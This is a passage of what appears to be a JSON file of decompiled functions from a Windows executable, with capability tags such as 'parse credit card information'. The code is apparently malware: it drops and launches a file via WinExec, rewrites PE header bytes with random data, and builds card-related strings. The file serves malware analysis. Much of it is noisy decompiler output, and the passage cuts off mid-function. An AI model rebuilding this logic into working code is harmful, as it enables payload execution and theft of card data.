        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00403650(int32_t *hWnd)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t hLibModule;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4053c0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)();\n    hLibModule = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    if (hLibModule == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_RegisterWindowMessageA)();\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)();\n    pcVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hLibModule, 0x4116dc);\n    if (pcVar1 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar2 = (*pcVar1)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar2 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n        var_4h._0_1_ = 1;\n        iVar2 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar2 < 0) || (var_24h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n            var_4h._0_1_ = 0;\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n                    var_4h._0_1_ = 4;\n                    iVar2 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar2 < 0) || (hWnd == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\njoined_r0x00403a86:\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x00403a92:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar2 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if ((iVar2 < 0) || (var_10h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\njoined_r0x00403a4d:\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x00403a92;\n                    }\n                    iVar2 = (**(*var_10h + 0x38))(var_10h, &pbstr);\n                    if (iVar2 < 0) {\ncode_r0x00403a0e:\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\n                        goto joined_r0x00403a4d;\n                    }\n                    if (pbstr == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\njoined_r0x00403889:\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00403440(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x4116f0);\n                        if (iVar3 != 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            goto joined_r0x00403889;\n                        }\n                        var_14h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 5;\n                        iVar2 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar2 < 0) || (var_14h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\njoined_r0x00403a32:\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                            goto joined_r0x00403a86;\n                        }\n                        iVar2 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar3 = var_3ch;\n                        if (iVar2 < 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            goto joined_r0x00403a32;\n                        }\n                        if (var_3ch == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar5 = &var_147h;\n                            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar5 = 0;\n                                puVar5 = puVar5 + 1;\n                            }\n                            *puVar5 = 0;\n                            *(puVar5 + 2) = 0;\n                            fcn.00403440(iVar3, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar3 = fcn.00403570(&var_148h);\n                            if (iVar3 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n    // WARNING: Ignoring partial resolution of indirect\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto code_r0x00403a0e;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                        }\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n    // WARNING: Ignoring partial resolution of indirect\n            var_4h._0_1_ = 0;\n        }\n        if (var_24h != NULL) {\n            (**(*var_24h + 8))(var_24h);\n        }\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar2;\n}\n",
        "token_count": 2664
    },
    "00403040": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403196) overlaps instruction at (ram,0x00403195)\n// \n// WARNING: Removing unreachable block (ram,0x00403143)\n// WARNING: Removing unreachable block (ram,0x004030f5)\n// WARNING: Removing unreachable block (ram,0x00403215)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403040(int16_t *arg_8h)\n\n{\n    uint *puVar1;\n    int16_t *piVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint32_t unaff_EDI;\n    uchar *puVar9;\n    uint *puVar10;\n    uint8_t uVar11;\n    uint8_t in_AF;\n    bool bVar12;\n    bool bVar13;\n    uint64_t uVar14;\n    uint uVar15;\n    uint var_4h;\n    \n    if (*arg_8h != 0x5a4d) {\n        return 0;\n    }\n    if (*(*(arg_8h + 0x1e) + arg_8h) != 0x4550) {\n        return 0;\n    }\n    if ((*(arg_8h + 0x1e) + arg_8h)[0x16] != 0) {\n        return 0;\n    }\n    uVar6 = *(arg_8h + 0x1e);\n    if (0x80 < *(arg_8h + 0x1e)) {\n        piVar2 = arg_8h;\n        if ((0x7f < uVar6) && (uVar6 < 0x80)) {\n            *(unaff_EDI | &stack0xfffffffc) = arg_8h;\n            piVar2 = arg_8h & 0xffff0000 | arg_8h + (arg_8h >> 8) * 'y';\n        }\n        puVar10 = *(piVar2 + 0x1e) - 0x80;\n        if (0xbf < *(piVar2 + 0x1e)) {\n            puVar10 = 0x40;\n        }\n        uVar14 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(puVar10);\n        do {\n            puVar3 = uVar14;\n            if (puVar3 == NULL) {\n                return 0;\n            }\n            uVar11 = false;\n            bVar13 = false;\n            bVar12 = puVar10 == NULL;\n            puVar5 = puVar3;\n            piVar2 = uVar14 >> 0x20;\n            puVar8 = NULL;\n            puVar7 = puVar10;\n            puVar1 = puVar10;\n            if (bVar12) goto code_r0x004031d2;\n            while ((uVar15 = uVar14 >> 0x20,  uVar14 = uVar14 & 0xffffffff | ZEXT48(piVar2) << 0x20,  uVar11 || bVar12\n                   || (!uVar11 && !bVar12))) {\n                iVar4 = (*_sym.imp.MSVCRT.dll_rand)(uVar15);\n                puVar5 = iVar4 / 0xff;\n                uVar14 = CONCAT44(uVar15, puVar5);\n                puVar7 = puVar8 + 1;\n                uVar11 = puVar7 < puVar10;\n                bVar13 = SBORROW4(puVar7, puVar10);\n                puVar1 = puVar7 - puVar10;\n                bVar12 = puVar7 == puVar10;\n                *(puVar8 + puVar3) = iVar4 % 0xff;\n                piVar2 = iVar4 % 0xff;\n                puVar8 = puVar7;\n                puVar7 = puVar10;\n                if (!uVar11) {\ncode_r0x004031d2:\n                    if ((bVar13 == puVar1 < 0) && (bVar13 != puVar1 < 0)) {\n                        puVar9 = puVar7 | &stack0xfffffffc;\n                        puVar7 = puVar9 + 1;\n                        *puVar9 = puVar5;\n                    }\n                    puVar8 = puVar3;\n                    puVar10 = arg_8h + 0x40;\n                    for (uVar6 = puVar7 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n                        *puVar10 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    bVar13 = false;\n                    uVar6 = puVar7 & 3;\n                    bVar12 = uVar6 == 0;\n                    for (; uVar6 != 0; uVar6 = uVar6 - 1) {\n                        *puVar10 = *puVar8;\n                        puVar8 = puVar8 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    if ((bVar12) || (!bVar12)) {\n                        sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar3);\n                        return 1;\n                    }\n                    uVar11 = 9 < (puVar7 & 0xf) | in_AF;\n                    uVar14 = CONCAT44(*(puVar8 + 0x39), \n                                      puVar7 & 0xffff0000 |\n                                      CONCAT11((puVar7 >> 8) + uVar11, puVar7 + uVar11 * '\\x06') & 0xff0f);\n                    piVar2 = arg_8h;\n                    in_AF = uVar11;\n                }\n            }\n            if (!bVar13) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n        } while( true );\n    }\n    return 0;\n}\n",
        "token_count": 1351
    },
    "00404620": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404620(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x423780 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004041e0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4115a8, acStack1304, &uStack2112);\n    uStack2088 = 0x411630;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x411648;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401fb0(auStack1564, 0x4115a4, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1867
    },
    "00402060": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004024d4) overlaps instruction at (ram,0x004024d2)\n// \n// WARNING: Removing unreachable block (ram,0x00402192)\n\nvoid fcn.00402060(void)\n\n{\n    unkbyte6 Var1;\n    uint8_t uVar2;\n    uint8_t extraout_AH;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    ushort extraout_CX;\n    ushort extraout_CX_00;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint16_t uVar8;\n    char extraout_CH;\n    char extraout_CH_00;\n    int32_t extraout_ECX;\n    uint8_t uVar9;\n    int32_t extraout_ECX_00;\n    uint16_t extraout_DX;\n    int32_t extraout_EDX;\n    uint32_t unaff_EBX;\n    uint *unaff_EDI;\n    uint *arg_ch;\n    ushort in_SS;\n    uchar uVar10;\n    uchar uVar11;\n    bool bVar12;\n    char cVar13;\n    uchar uVar14;\n    char cVar15;\n    bool bVar16;\n    bool bVar17;\n    unkbyte3 Var18;\n    unkbyte3 Var19;\n    uchar uVar20;\n    ushort uVar21;\n    uchar uVar22;\n    ushort uVar23;\n    uchar uVar24;\n    uint arg_10h;\n    uint8_t uVar25;\n    uint8_t uVar26;\n    \n    fcn.00401d20(0x411754, 0x12, 0x4112e8, 10);\n    fcn.00401d20(0x411754, 0x12, 0x4112f4, 0x12);\n    fcn.00401d20(0x411754, 0x12, 0x411308, 4);\n    fcn.00401d20(0x411754, 0x12, 0x41130c, 0xc);\n    fcn.00401d20(0x411754, 0x12, 0x411318, 7);\n    cVar15 = '\\0';\n    cVar13 = '\\0';\n    uVar3 = fcn.00401d20(0x411754, 0x12, 0x411320, 0xb);\n    arg_ch = unaff_EDI;\n    if ((cVar15 == cVar13) && (cVar15 != cVar13)) {\n        out(0xc4, uVar3);\n        arg_ch = unaff_EDI + 1;\n        *unaff_EDI = uVar3;\n    }\n    uVar14 = 0xc;\n    uVar20 = 0;\n    uVar21 = 0;\n    arg_10h = 0x41132c;\n    uVar3 = 0x12;\n    do {\n        fcn.00401d20(0x411754, uVar3, arg_10h, CONCAT22(uVar21, CONCAT11(uVar20, uVar14)));\n        fcn.00401d20(0x411754, 0x12, 0x411338, 8);\n        fcn.00401d20(0x411754, 0x12, 0x411340, 0xd);\n        uVar10 = 0;\n        bVar16 = false;\n        uVar11 = (POPCOUNT((extraout_AH ^ 0x68) & 0x30) & 1U) == 0;\n        uVar2 = 0x18;\n        uVar9 = 0;\n        uVar23 = 0;\n        fcn.00401d20(0x411754, 0x12, 0x411350, 0x18);\n        if ((!bVar16) && (bVar16)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar14 = 0x25;\n        uVar20 = 0;\n        uVar21 = 0;\n        arg_10h = 0x411368;\n        uVar3 = 0x12;\n        fcn.00401d20(0x411754, 0x12, 0x411368, 0x25);\n        uVar25 = unaff_EBX & 0xffff;\n        uVar26 = (unaff_EBX & 0xffff) >> 8;\n        if ((uVar11) || (!uVar11)) break;\n        segment(in_SS, *0x10 + -0x38);\n        uVar6 = extraout_CX;\n        if (uVar10) goto code_r0x00402289;\n    } while (uVar11);\n    fcn.00401d20(0x411754, 0x12, 0x411390, 10);\n    uVar6 = extraout_CX_00;\n    uVar2 = uVar25;\n    uVar9 = uVar26;\n    uVar23 = ((unaff_EBX >> 8 & 0xffff00) << 8) >> 0x10;\ncode_r0x00402289:\n    cVar15 = '\\0';\n    uVar7 = CONCAT11(uVar6 >> 8 & uVar26, uVar6 | uVar25) & arg_ch;\n    cVar13 = uVar7 < 0;\n    bVar16 = uVar7 == 0;\n    uVar7 = CONCAT11(uVar9, uVar2);\n    uVar14 = 0xa6;\n    uVar20 = 0x22;\n    uVar21 = 0x40;\n    fcn.00401d20(0x411754, 0x12, 0x41139c, 0xc);\n    if ((bVar16 || cVar15 != cVar13) || (!bVar16 && cVar15 == cVar13)) {\n        uVar14 = 0xd;\n        uVar20 = 0;\n        uVar21 = 0;\n    }\n    fcn.00401d20(0x411754, 0x12, 0x4113a8, CONCAT22(uVar21, CONCAT11(uVar20, uVar14)));\n    fcn.00401d20(0x411754, 0x12, 0x4113b8, 6);\n    fcn.00401d20(0x411754, 0x12, 0x4113c0, 5);\n    fcn.00401d20(0x411754, 0x12, 0x4113c8, 0xd);\n    fcn.00401d20(0x411754, 0x12, 0x4113d8, 0x19);\n    fcn.00401d20(0x411754, 0x12, 0x4113f4, 0xf);\n    iVar4 = fcn.00401d20(0x411754, 0x12, 0x411404, 0xe);\n    iVar4 = extraout_ECX - iVar4;\n    while( true ) {\n        uVar8 = iVar4 & 0xff00 | iVar4 ^ iVar4 >> 8 | 0x3d00 | uVar7;\n        uVar2 = uVar8;\n        uVar9 = uVar8 >> 8;\n        bVar16 = uVar9 < uVar2;\n        uVar14 = uVar9 - uVar2 < '\\0';\n        puVar5 = fcn.00401d20(0x411754, 0x12, 0x411414, 0xb);\n        if ((bVar16) || (!bVar16)) break;\n        iVar4 = extraout_ECX_00;\n        if (&stack0xffffffd8 < *puVar5 || puVar5 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    uVar3 = 0x411420;\n    Var18 = 0;\n    uVar20 = 0x25;\n    uVar10 = 0x24;\n    uVar21 = 0x40;\n    fcn.00401d20(0x411754, 0x12, 0x411420, 0xb);\n    if ((uVar14) || (!uVar14)) {\n        uVar20 = 0xb;\n        uVar10 = 0;\n        uVar21 = 0;\n    }\n    *CONCAT22(uVar23, uVar7) = *CONCAT22(uVar23, uVar7) & 0xc3;\n    uVar2 = fcn.00401d20(0x411754, 0x12, 0x41142c, CONCAT22(uVar21, CONCAT11(uVar10, uVar20)));\n    bVar16 = (POPCOUNT(uVar2 ^ 0xca) & 1U) == 0;\n    uVar14 = 0x54;\n    iVar4 = fcn.00401d20(0x411754, 0x12, 0x411438, 10);\n    Var1 = *0x6a17b43a;\n    if (!bVar16) {\n        uVar20 = SUB41(arg_ch, 0);\n        uVar10 = arg_ch >> 8;\n        uVar21 = arg_ch >> 0x10;\n        if (bVar16) goto code_r0x0040247e;\n    }\n    uVar20 = 0xc;\n    uVar10 = 0;\n    uVar21 = 0;\n    uVar3 = 0x411444;\n    Var18 = 0;\ncode_r0x0040247e:\n    *(iVar4 + 0x12) = *(iVar4 + 0x12) + extraout_CH;\n    fcn.00401d20(0x411754, CONCAT13(uVar3, Var18), CONCAT13(uVar20, uVar3 >> 8), \n                 CONCAT13(uVar14, CONCAT21(uVar21, uVar10)));\n    fcn.00401d20(0x411754, 0x12, 0x411450, 0xe);\n    *(extraout_EDX + 0x12) = *(extraout_EDX + 0x12) + extraout_CH_00;\n    fcn.00401d20(0x411754, arg_ch, 0x34a96cf4, Var1);\n    uVar22 = 0x13;\n    uVar23 = 0;\n    uVar24 = 0;\n    uVar10 = 0x74;\n    uVar21 = 0x4114;\n    uVar11 = 0;\n    uVar20 = 0;\n    Var18 = 0x411754;\n    Var19 = 0x12;\n    uVar14 = 0;\n    while( true ) {\n        uVar8 = fcn.00401d20(CONCAT13(uVar14, Var18), CONCAT13(uVar20, Var19), \n                             CONCAT13(uVar11, CONCAT21(uVar21, uVar10)), CONCAT13(uVar24, CONCAT21(uVar23, uVar22)));\n        bVar16 = false;\n        bVar17 = false;\n        bVar12 = (((uVar8 & 0xff | (uVar8 >> 8 & extraout_DX >> 8) << 8) * 2 | extraout_DX) ^ 0x6c00) == uVar7;\n        uVar22 = 0x14;\n        uVar23 = 0;\n        uVar24 = 0;\n        uVar10 = 0x88;\n        uVar21 = 0x4114;\n        uVar11 = 0;\n        uVar20 = 0;\n        Var19 = 0x12;\n        uVar14 = 0;\n        Var18 = 0x411754;\n        fcn.00401d20(0x411754, 0x12, 0x411488, 0x14);\n        if ((bVar16 || bVar12) || (!bVar16 && !bVar12)) break;\n        if (!bVar17) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.00401d20(0x411754, 0x12, 0x41149c, 0x33);\n    fcn.00401d20(0x411754, 0x12, 0x4114d0, 10);\n    fcn.00401d20(0x411754, 0x12, 0x4114dc, 4);\n    fcn.00401d20(0x411754, 0x12, 0x4114e0, 5);\n    fcn.00401d20(0x411754, 0x12, 0x4114e8, 6);\n    fcn.00401d20(0x411754, 0x12, 0x41151c, 0x2a);\n    fcn.00401d20(0x411754, 0x12, 0x411548, 0xb);\n    return;\n}\n",
        "token_count": 2984
    },
    "00402670": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402925) overlaps instruction at (ram,0x00402924)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.00402670(int32_t param_1, char *param_2)\n\n{\n    char *pcVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    uint8_t extraout_AH;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint *puVar5;\n    uint8_t extraout_CL;\n    uint8_t extraout_CH;\n    uint16_t extraout_CX;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint8_t extraout_CH_00;\n    uint extraout_ECX_01;\n    uint8_t extraout_DL;\n    uint8_t uVar6;\n    int32_t extraout_EDX;\n    uint16_t uVar7;\n    uint32_t unaff_EBX;\n    uint8_t *puVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uchar *puVar14;\n    uint32_t unaff_EBP;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint32_t uVar15;\n    bool in_PF;\n    uint8_t in_AF;\n    bool bVar16;\n    bool bVar17;\n    char cVar18;\n    char cVar19;\n    ulong uVar20;\n    unkbyte6 Var21;\n    int32_t iStackY128;\n    uint uVar22;\n    uint in_stack_ffffffdc;\n    uint in_stack_ffffffe0;\n    uint uVar23;\n    uint in_stack_fffffff0;\n    ushort in_stack_fffffff4;\n    \n    if ((in_PF) || (uVar23 = CONCAT22(unaff_ESI, in_stack_fffffff4),  !in_PF)) {\n        uVar23 = 0x11;\n        in_stack_fffffff0 = 0x4112d4;\n    }\n    else {\n        out(*unaff_ESI, param_2);\n        do {\n            cVar18 = in_EAX >> 8;\n            in_AF = 9 < (in_EAX & 0xf) | in_AF;\n            in_EAX = CONCAT31(CONCAT21(in_EAX >> 0x10, cVar18 - in_AF), -in_AF);\n        } while (in_AF || cVar18 == *param_2);\n        puVar2 = unaff_EDI + param_2 * 2;\n        uVar15 = *puVar2;\n        uVar3 = *puVar2;\n        *puVar2 = (uVar3 + 0x7b) - in_AF;\n        *(param_1 + 0x6a) = in_EAX;\n        *(in_EAX 